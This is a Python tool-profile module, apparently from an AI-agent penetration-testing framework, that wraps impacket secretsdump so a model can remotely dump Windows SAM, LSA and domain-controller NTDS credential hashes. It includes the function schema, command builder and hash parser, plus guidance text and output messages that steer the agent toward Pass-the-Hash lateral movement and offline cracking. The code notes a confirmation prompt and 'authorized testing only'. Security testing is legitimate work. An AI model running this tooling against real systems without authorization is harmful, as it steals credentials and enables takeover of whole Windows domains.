"""secretsdump（impacket 系）深度定制：远程提取 Windows 凭据/hash（危险操作）。"""

from __future__ import annotations

import re
import shutil
from typing import Any

from .base import ToolProfile, check_installed, sanitize_target

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "secrets_dump",
            "description": (
                "用 impacket secretsdump 远程提取 Windows 凭据（SAM/LSA/NTDS hash）。"
                "⚠ 危险操作：会触发确认弹窗。需要管理员凭据；通常用在域渗透的提权/横向阶段。"
                "拿到的 hash 可直接 Pass-the-Hash（winrm_exec）或离线破解（crack_hash）。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string", "description": "目标 Windows 主机 IP"},
                    "username": {"type": "string", "description": "管理员用户名"},
                    "password": {"type": "string", "description": "明文密码（与 hash 二选一）"},
                    "hash": {
                        "type": "string",
                        "description": "管理员 NTLM hash（Pass-the-Hash）",
                    },
                    "domain": {"type": "string", "description": "域名（可选，默认空）"},
                    "target": {
                        "type": "string",
                        "description": "提取目标：sam（本地 SAM）、lsa（LSA 机密）、ntds（域控 NTDS，默认）",
                    },
                },
                "required": ["host", "username"],
            },
        },
    },
]

_HASH_RE = re.compile(r"^[0-9a-fA-F]{32}$")
_CRED_RE = re.compile(r"^[\w.\-\\$]{1,64}$")


def _bin() -> str:
    for name in ("secretsdump.py", "secretsdump", "impacket-secretsdump"):
        if check_installed(name):
            return name
    return ""


def _build_cmd(args: dict[str, Any]) -> tuple[str, int]:
    host = sanitize_target(str(args["host"]))
    username = str(args.get("username") or "").strip()
    if not _CRED_RE.match(username):
        raise ValueError(f"username 格式非法: {username!r}")
    password = str(args.get("password") or "").strip()
    hashv = str(args.get("hash") or "").strip()
    if bool(password) == bool(hashv):
        raise ValueError("password 与 hash 必须且只能提供一个")
    if hashv and not _HASH_RE.match(hashv):
        raise ValueError("hash 必须是 32 位 NTLM hash")
    domain = str(args.get("domain") or "").strip()
    if domain and not _CRED_RE.match(domain):
        raise ValueError(f"domain 格式非法: {domain!r}")
    target = str(args.get("target") or "ntds").strip().lower()
    if target not in ("sam", "lsa", "ntds"):
        raise ValueError("target 仅支持: sam / lsa / ntds")

    bin_ = _bin()
    if not bin_:
        return "", 0
    prefix = f"{domain}\\" if domain else ""
    if password:
        conn = f"{prefix}{username}:{password}@{host}"
    else:
        conn = f"{prefix}{username}@{host}"
    extra = {"sam": "-sam", "lsa": "-lsa", "ntds": "-ntds"}[target]
    return f"{bin_} {extra} {conn} -just-dc-ntlm" if target == "ntds" else f"{bin_} {extra} {conn}", 300


class SecretsdumpProfile(ToolProfile):
    name = "secretsdump"
    aliases = ["secretsdump", "impacket", "提取 hash", "ntds", "lsass", "dumphash", "提取", "域控"]
    summary = "Windows 凭据提取（impacket）"
    lore = """### secretsdump 深度使用要点
- 定位：拿到域管理员/本地管理员凭据后，提取所有凭据用于横向。
- sam：本地账号 hash；lsa：服务账户明文/机密；ntds：域控全量 hash（最高价值，通常 offline 更快）。
- 拿到 hash 后：Pass-the-Hash 直接登录其他主机（winrm_exec -H / smbclient -H）；或用 crack_hash 离线破解。
- 域控 ntds 提取慢（几分钟），耐心等；输出里的 `$` 结尾是机器账户（一般没用）。
- 高风险动作：安全层会确认；提取的数据只用于授权测试。"""
    extra_schemas = SCHEMAS

    async def exec_secrets_dump(self, ex: Any, args: dict[str, Any]) -> str:
        bin_ = _bin()
        if not bin_:
            return "secretsdump 未安装（apt install impacket-scripts 或 pip install impacket）。"
        cmd, timeout = _build_cmd(args)
        raw = await self._run(ex, cmd, timeout=timeout)
        # 命中格式: domain\user:uid:lmhash:nthash:::
        hashes = [
            l.strip()
            for l in raw.splitlines()
            if re.search(r":\d+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:::", l)
        ]
        if hashes:
            head = [f"🎯 提取到凭据 ({len(hashes)}):"] + hashes[:25]
            if len(hashes) > 25:
                head.append(f"… 共 {len(hashes)} 条")
            head.append("下一步：用 hash 做 Pass-the-Hash 横向（winrm_exec），或 crack_hash 离线破解。")
        else:
            head = ["未提取到 hash（凭据无效/权限不足/目标不支持）"]
        return self._summary(raw, head, tail=40)
